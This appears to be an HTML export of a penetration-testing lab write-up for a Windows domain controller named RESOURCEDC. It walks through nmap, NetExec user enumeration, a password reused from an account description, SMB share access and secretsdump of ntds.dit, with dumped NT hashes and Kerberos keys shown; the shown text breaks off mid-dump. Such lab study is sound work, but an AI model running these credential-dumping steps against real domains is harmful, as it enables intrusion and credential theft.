+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         Microsoft Windows RPC
+49694/tcp open  msrpc         Microsoft Windows RPC
+49712/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2026-01-22T22:20:35
+|_  start_date: N/A
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT     ADDRESS
+1   8.28 ms 192.168.45.1
+2   5.73 ms 192.168.45.254
+3   8.75 ms 192.168.251.1
+4   8.80 ms 192.168.131.175
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 224.06 seconds</code></pre></div>
+<p>We can use <code class="inline-code">rpcclient</code> to get domain users. Even better, we can use NetExec to get the domain users with their account description:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc smb 192.168.131.175 --users                              
+SMB         192.168.131.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
+SMB         192.168.131.175 445    RESOURCEDC       -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         192.168.131.175 445    RESOURCEDC       Administrator                 2022-02-11 17:21:20 0       Built-in account for administering the computer/domain 
+SMB         192.168.131.175 445    RESOURCEDC       Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         192.168.131.175 445    RESOURCEDC       krbtgt                        2021-10-01 11:08:53 0       Key Distribution Center Service Account 
+SMB         192.168.131.175 445    RESOURCEDC       M.Mason                       2021-10-01 11:14:51 0       Ex IT admin 
+SMB         192.168.131.175 445    RESOURCEDC       K.Keen                        2021-10-01 11:14:51 0       Frontend Developer 
+SMB         192.168.131.175 445    RESOURCEDC       L.Livingstone                 2021-10-01 11:14:51 0       SysAdmin 
+SMB         192.168.131.175 445    RESOURCEDC       J.Johnson                     2021-10-01 11:14:52 0       Networking specialist 
+SMB         192.168.131.175 445    RESOURCEDC       V.Ventz                       2021-10-01 11:14:52 0       New-hired, reminder: HotelCalifornia194! 
+SMB         192.168.131.175 445    RESOURCEDC       S.Swanson                     2021-10-01 11:14:52 0       Military Vet now cybersecurity specialist 
+SMB         192.168.131.175 445    RESOURCEDC       P.Parker                      2021-10-01 11:14:52 0       Backend Developer 
+SMB         192.168.131.175 445    RESOURCEDC       R.Robinson                    2021-10-01 11:14:52 0       Database Admin 
+SMB         192.168.131.175 445    RESOURCEDC       D.Durant                      2021-10-01 11:14:52 0       Linear Algebra and crypto god 
+SMB         192.168.131.175 445    RESOURCEDC       G.Goldberg                    2021-10-01 11:14:52 0       Blockchain expert 
+SMB         192.168.131.175 445    RESOURCEDC       [*] Enumerated 13 local users: resourced</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc smb 192.168.131.175 --users                              
+SMB         192.168.131.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
+SMB         192.168.131.175 445    RESOURCEDC       -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         192.168.131.175 445    RESOURCEDC       Administrator                 2022-02-11 17:21:20 0       Built-in account for administering the computer/domain 
+SMB         192.168.131.175 445    RESOURCEDC       Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         192.168.131.175 445    RESOURCEDC       krbtgt                        2021-10-01 11:08:53 0       Key Distribution Center Service Account 
+SMB         192.168.131.175 445    RESOURCEDC       M.Mason                       2021-10-01 11:14:51 0       Ex IT admin 
+SMB         192.168.131.175 445    RESOURCEDC       K.Keen                        2021-10-01 11:14:51 0       Frontend Developer 
+SMB         192.168.131.175 445    RESOURCEDC       L.Livingstone                 2021-10-01 11:14:51 0       SysAdmin 
+SMB         192.168.131.175 445    RESOURCEDC       J.Johnson                     2021-10-01 11:14:52 0       Networking specialist 
+SMB         192.168.131.175 445    RESOURCEDC       V.Ventz                       2021-10-01 11:14:52 0       New-hired, reminder: HotelCalifornia194! 
+SMB         192.168.131.175 445    RESOURCEDC       S.Swanson                     2021-10-01 11:14:52 0       Military Vet now cybersecurity specialist 
+SMB         192.168.131.175 445    RESOURCEDC       P.Parker                      2021-10-01 11:14:52 0       Backend Developer 
+SMB         192.168.131.175 445    RESOURCEDC       R.Robinson                    2021-10-01 11:14:52 0       Database Admin 
+SMB         192.168.131.175 445    RESOURCEDC       D.Durant                      2021-10-01 11:14:52 0       Linear Algebra and crypto god 
+SMB         192.168.131.175 445    RESOURCEDC       G.Goldberg                    2021-10-01 11:14:52 0       Blockchain expert 
+SMB         192.168.131.175 445    RESOURCEDC       [*] Enumerated 13 local users: resourced</code></pre></div>
+<p>Possible credentials <code class="inline-code">V.Ventz:HotelCalifornia194!</code>? The credentials seem to work:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc smb 192.168.131.175 -u v.ventz -p &apos;HotelCalifornia194!&apos; 
+SMB         192.168.131.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
+SMB         192.168.131.175 445    RESOURCEDC       [+] resourced.local\v.ventz:HotelCalifornia194!</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-<span class="hljs-selector-attr">[~/Desktop/Labs/Resourced]</span>
+&boxur;&boxh;$ nxc smb <span class="hljs-number">192.168</span>.<span class="hljs-number">131.175</span> -u v<span class="hljs-selector-class">.ventz</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&apos;HotelCalifornia194!&apos;</span> 
+SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">131.175</span> <span class="hljs-number">445</span>    RESOURCEDC       <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
+SMB         <span class="hljs-number">192.168</span>.<span class="hljs-number">131.175</span> <span class="hljs-number">445</span>    RESOURCEDC       <span class="hljs-selector-attr">[+]</span> resourced.local\v<span class="hljs-selector-class">.ventz</span>:HotelCalifornia194!</code></pre></div>
+<p>Checking for shares as the new user shows <code class="inline-code">Password Audit</code> is readable:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc smb 192.168.131.175 -u v.ventz -p &apos;HotelCalifornia194!&apos; --shares
+SMB         192.168.131.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
+SMB         192.168.131.175 445    RESOURCEDC       [+] resourced.local\v.ventz:HotelCalifornia194! 
+SMB         192.168.131.175 445    RESOURCEDC       [*] Enumerated shares
+SMB         192.168.131.175 445    RESOURCEDC       Share           Permissions     Remark
+SMB         192.168.131.175 445    RESOURCEDC       -----           -----------     ------
+SMB         192.168.131.175 445    RESOURCEDC       ADMIN$                          Remote Admin
+SMB         192.168.131.175 445    RESOURCEDC       C$                              Default share
+SMB         192.168.131.175 445    RESOURCEDC       IPC$            READ            Remote IPC
+SMB         192.168.131.175 445    RESOURCEDC       NETLOGON        READ            Logon server share 
+SMB         192.168.131.175 445    RESOURCEDC       Password Audit  READ            
+SMB         192.168.131.175 445    RESOURCEDC       SYSVOL          READ            Logon server share</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ nxc smb 192.168.131.175 -u v.ventz -p &apos;HotelCalifornia194!&apos; --shares
+SMB         192.168.131.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
+SMB         192.168.131.175 445    RESOURCEDC       [+] resourced.local\v.ventz:HotelCalifornia194! 
+SMB         192.168.131.175 445    RESOURCEDC       [*] Enumerated shares
+SMB         192.168.131.175 445    RESOURCEDC       Share           Permissions     Remark
+SMB         192.168.131.175 445    RESOURCEDC       -----           -----------     ------
+SMB         192.168.131.175 445    RESOURCEDC       ADMIN$                          Remote Admin
+SMB         192.168.131.175 445    RESOURCEDC       C$                              Default share
+SMB         192.168.131.175 445    RESOURCEDC       IPC$            READ            Remote IPC
+SMB         192.168.131.175 445    RESOURCEDC       NETLOGON        READ            Logon server share 
+SMB         192.168.131.175 445    RESOURCEDC       Password Audit  READ            
+SMB         192.168.131.175 445    RESOURCEDC       SYSVOL          READ            Logon server share</code></pre></div>
+<p>Connect to the <code class="inline-code">Password Audit</code> share. Two directories exist, <code class="inline-code">Active Directory</code> and <code class="inline-code">registry</code>:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ smbclient -U resourced.local/v.ventz //192.168.131.175/&quot;Password Audit&quot; 
+Password for [RESOURCED.LOCAL\v.ventz]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Tue Oct  5 04:49:16 2021
+  ..                                  D        0  Tue Oct  5 04:49:16 2021
+  Active Directory                    D        0  Tue Oct  5 04:49:15 2021
+  registry                            D        0  Tue Oct  5 04:49:16 2021
+
+        7706623 blocks of size 4096. 2716252 blocks available
+smb: \&gt; 
+</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ smbclient -U resourced.local/v.ventz //192.168.131.175/&quot;Password Audit&quot; 
+Password for [RESOURCED.LOCAL\v.ventz]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D       <span class="hljs-number"> 0 </span> Tue Oct <span class="hljs-number"> 5 </span>04:49:16 2021
+  ..                                  D       <span class="hljs-number"> 0 </span> Tue Oct <span class="hljs-number"> 5 </span>04:49:16 2021
+  Active Directory                    D       <span class="hljs-number"> 0 </span> Tue Oct <span class="hljs-number"> 5 </span>04:49:15 2021
+  registry                            D       <span class="hljs-number"> 0 </span> Tue Oct <span class="hljs-number"> 5 </span>04:49:16 2021
+
+       <span class="hljs-number"> 7706623 </span>blocks of size 4096.<span class="hljs-number"> 2716252 </span>blocks available
+smb: \&gt; 
+</code></pre></div>
+<p>It looks like <code class="inline-code">SYSTEM</code> and <code class="inline-code">SECURITY</code> hives are accessible inside the <code class="inline-code">registry</code> hive:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">smb: \&gt; cd registry
+smb: \registry\&gt; dir
+  .                                   D        0  Tue Oct  5 04:49:16 2021
+  ..                                  D        0  Tue Oct  5 04:49:16 2021
+  SECURITY                            A    65536  Mon Sep 27 06:45:20 2021
+  SYSTEM                              A 16777216  Mon Sep 27 06:45:20 2021
+
+        7706623 blocks of size 4096. 2716252 blocks available
+smb: \registry\&gt; get SYSTEM
+getting file \registry\SYSTEM of size 16777216 as SYSTEM (7892.1 KiloBytes/sec) (average 7892.1 KiloBytes/sec)
+smb: \registry\&gt; get SECURITY
+getting file \registry\SECURITY of size 65536 as SECURITY (418.3 KiloBytes/sec) (average 7379.1 KiloBytes/sec)
+smb: \registry\&gt; 
+</pre><pre class="hljs"><code>smb: \&gt; cd registry
+smb: \registry\&gt; dir
+  .                                   D        <span class="hljs-number">0</span>  Tue Oct  <span class="hljs-number">5</span> <span class="hljs-number">04</span>:<span class="hljs-number">49</span>:<span class="hljs-number">16</span> <span class="hljs-number">2021</span>
+  ..                                  D        <span class="hljs-number">0</span>  Tue Oct  <span class="hljs-number">5</span> <span class="hljs-number">04</span>:<span class="hljs-number">49</span>:<span class="hljs-number">16</span> <span class="hljs-number">2021</span>
+  SECURITY                            A    <span class="hljs-number">65536</span>  Mon Sep <span class="hljs-number">27</span> <span class="hljs-number">06</span>:<span class="hljs-number">45</span>:<span class="hljs-number">20</span> <span class="hljs-number">2021</span>
+  SYSTEM                              A <span class="hljs-number">16777216</span>  Mon Sep <span class="hljs-number">27</span> <span class="hljs-number">06</span>:<span class="hljs-number">45</span>:<span class="hljs-number">20</span> <span class="hljs-number">2021</span>
+
+        <span class="hljs-number">7706623</span> blocks <span class="hljs-keyword">of</span> size <span class="hljs-number">4096.</span> <span class="hljs-number">2716252</span> blocks available
+smb: \registry\&gt; <span class="hljs-built_in">get</span> SYSTEM
+getting <span class="hljs-built_in">file</span> \registry\SYSTEM <span class="hljs-keyword">of</span> size <span class="hljs-number">16777216</span> <span class="hljs-keyword">as</span> SYSTEM (<span class="hljs-number">7892.1</span> KiloBytes/<span class="hljs-built_in">sec</span>) (<span class="hljs-built_in">average</span> <span class="hljs-number">7892.1</span> KiloBytes/<span class="hljs-built_in">sec</span>)
+smb: \registry\&gt; <span class="hljs-built_in">get</span> SECURITY
+getting <span class="hljs-built_in">file</span> \registry\SECURITY <span class="hljs-keyword">of</span> size <span class="hljs-number">65536</span> <span class="hljs-keyword">as</span> SECURITY (<span class="hljs-number">418.3</span> KiloBytes/<span class="hljs-built_in">sec</span>) (<span class="hljs-built_in">average</span> <span class="hljs-number">7379.1</span> KiloBytes/<span class="hljs-built_in">sec</span>)
+smb: \registry\&gt; 
+</code></pre></div>
+<p>Downloading the hives and extracting the credentials from the two hives does not result in anything useful:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ impacket-secretsdump -security SECURITY -system SYSTEM local
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
+dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
+[*] NL$KM 
+ 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.&gt;.J......I.
+ 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
+ 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
+ 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
+NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
+[*] Cleaning up...</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ impacket-secretsdump -security SECURITY -system SYSTEM local
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
+dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
+[*] NL$KM 
+ 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.&gt;.J......I.
+ 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
+ 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
+ 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
+NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
+[*] Cleaning up...</code></pre></div>
+<p>Inside the <code class="inline-code">Active Directory</code> directory, the file <code class="inline-code">ntds.dit</code> exists. This file is essentially contains the credentials of active directory accounts:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">smb: \&gt; cd &quot;Active Directory&quot;
+smb: \Active Directory\&gt; dir
+  .                                   D        0  Tue Oct  5 04:49:16 2021
+  ..                                  D        0  Tue Oct  5 04:49:16 2021
+  ntds.dit                            A 25165824  Mon Sep 27 07:30:54 2021
+  ntds.jfm                            A    16384  Mon Sep 27 07:30:54 2021
+
+        7706623 blocks of size 4096. 2720190 blocks available
+smb: \Active Directory\&gt; 
+smb: \Active Directory\&gt; mget *
+Get file ntds.dit? y
+getting file \Active Directory\ntds.dit of size 25165824 as ntds.dit (7088.5 KiloBytes/sec) (average 7202.2 KiloBytes/sec)
+Get file ntds.jfm? y
+getting file \Active Directory\ntds.jfm of size 16384 as ntds.jfm (164.9 KiloBytes/sec) (average 7084.4 KiloBytes/sec)
+smb: \Active Directory\&gt; 
+</pre><pre class="hljs"><code>smb: <span class="hljs-string">\&gt;</span> cd <span class="hljs-string">&quot;Active Directory&quot;</span>
+smb: <span class="hljs-string">\Active</span> Directory<span class="hljs-string">\&gt;</span> dir
+  .                                   D        <span class="hljs-number">0</span>  Tue Oct  <span class="hljs-number">5</span> <span class="hljs-number">04</span>:<span class="hljs-number">49</span>:<span class="hljs-number">16</span> <span class="hljs-number">2021</span>
+  ..                                  D        <span class="hljs-number">0</span>  Tue Oct  <span class="hljs-number">5</span> <span class="hljs-number">04</span>:<span class="hljs-number">49</span>:<span class="hljs-number">16</span> <span class="hljs-number">2021</span>
+  ntds.dit                            A <span class="hljs-number">25165824</span>  Mon Sep <span class="hljs-number">27</span> <span class="hljs-number">07</span>:<span class="hljs-number">30</span>:<span class="hljs-number">54</span> <span class="hljs-number">2021</span>
+  ntds.jfm                            A    <span class="hljs-number">16384</span>  Mon Sep <span class="hljs-number">27</span> <span class="hljs-number">07</span>:<span class="hljs-number">30</span>:<span class="hljs-number">54</span> <span class="hljs-number">2021</span>
+
+        <span class="hljs-number">7706623</span> blocks <span class="hljs-keyword">of</span> size <span class="hljs-number">4096.</span> <span class="hljs-number">2720190</span> blocks available
+smb: <span class="hljs-string">\Active</span> Directory<span class="hljs-string">\&gt;</span> 
+smb: <span class="hljs-string">\Active</span> Directory<span class="hljs-string">\&gt;</span> mget *
+Get file ntds.dit? y
+getting file <span class="hljs-string">\Active</span> Directory<span class="hljs-string">\ntds.dit</span> <span class="hljs-keyword">of</span> size <span class="hljs-number">25165824</span> <span class="hljs-keyword">as</span> ntds.dit (<span class="hljs-number">7088.5</span> KiloBytes/sec) (average <span class="hljs-number">7202.2</span> KiloBytes/sec)
+Get file ntds.jfm? y
+getting file <span class="hljs-string">\Active</span> Directory<span class="hljs-string">\ntds.jfm</span> <span class="hljs-keyword">of</span> size <span class="hljs-number">16384</span> <span class="hljs-keyword">as</span> ntds.jfm (<span class="hljs-number">164.9</span> KiloBytes/sec) (average <span class="hljs-number">7084.4</span> KiloBytes/sec)
+smb: <span class="hljs-string">\Active</span> Directory<span class="hljs-string">\&gt;</span> 
+</code></pre></div>
+<p>Now we can extract the contents of <code class="inline-code">ntds.dit</code> combined with the two other hives:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Resourced]
+&boxur;&boxh;$ impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
+dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
+[*] NL$KM 
+ 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.&gt;.J......I.
+ 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
+ 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
+ 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
+NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
+M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
+K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
+L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
+J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
+V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
+S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
+P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
+R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
+D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
+G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
+[*] Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
+Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
+Administrator:des-cbc-md5:80861f1a80f1232f
+RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
+RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
+RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
+krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
+krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
+krbtgt:des-cbc-md5:f1b602194f3713f8
+M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
+M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
+M.Mason:des-cbc-md5:268501b50e0bf47c
+K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
+K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
+K.Keen:des-cbc-md5:572cce13b38ce6da
+L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
+L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
+L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
+J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
+J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
+J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
+V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
+V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
+V.Ventz:des-cbc-md5:4af77a3d1cf7c480
+S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
+S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
+S.Swanson:des-cbc-md5:5d37583eae1f2f34
+P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
+P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
+P.Parker:des-cbc-md5:083b37079dcd764f
